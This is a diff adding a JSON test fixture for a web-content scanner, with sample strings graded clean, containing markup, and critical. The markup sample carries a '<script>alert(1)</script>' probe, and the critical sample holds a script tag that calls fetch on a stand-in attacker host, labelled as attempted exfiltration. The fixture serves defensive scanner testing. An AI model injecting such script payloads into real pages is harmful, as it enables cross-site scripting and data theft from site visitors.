@@ -1,0 +1,10 @@
+{
+  "tenantId": "tenant-keon",
+  "actorId": "user:3fa85f64-5717-4562-b3fc-2c963f66afa6",
+  "correlationId": "t:tenant-keon|c:scan-intake-001",
+  "policyVersion": "browseahead-policy.v1",
+  "scannedAtUtc": "2026-09-14T00:00:00Z",
+  "clean": "Acme Automations helps consultancies ship client workflow automation. Public team page, verified 2026-09-14.",
+  "withMarkup": "Acme Automations ships client workflow automation. <script>alert(1)</script> Team page verified.",
+  "criticalMarker": "CRITICAL-MARKER payload attempting exfiltration. <script>fetch('https://evil.invalid/x')</script>"
+}
